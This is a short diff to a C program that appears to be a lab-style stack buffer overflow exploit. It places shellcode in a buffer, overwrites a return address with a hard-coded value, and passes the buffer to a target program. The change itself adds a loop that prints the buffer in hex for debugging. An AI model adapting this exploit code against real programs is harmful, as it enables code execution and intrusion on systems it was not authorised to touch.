@@ -21,6 +21,13 @@ main ( int argc, char * argv[] )
 		attackBuffer[120 - shellcode_length + i] = shellcode[i];
 	}
 	*(unsigned *) & attackBuffer[120] = 0x3050fe10;
+
+
+	for (i = 0; i < 124;){
+		printf("%x\n", *(unsigned long *) &attackBuffer[i]);
+		i = i + 4;
+	}
+
 	args[0] = TARGET;
 	args[1] = attackBuffer;
 	args[2] = NULL;
@@ -32,3 +39,5 @@ main ( int argc, char * argv[] )
 
 	return (0);
 }
+
+
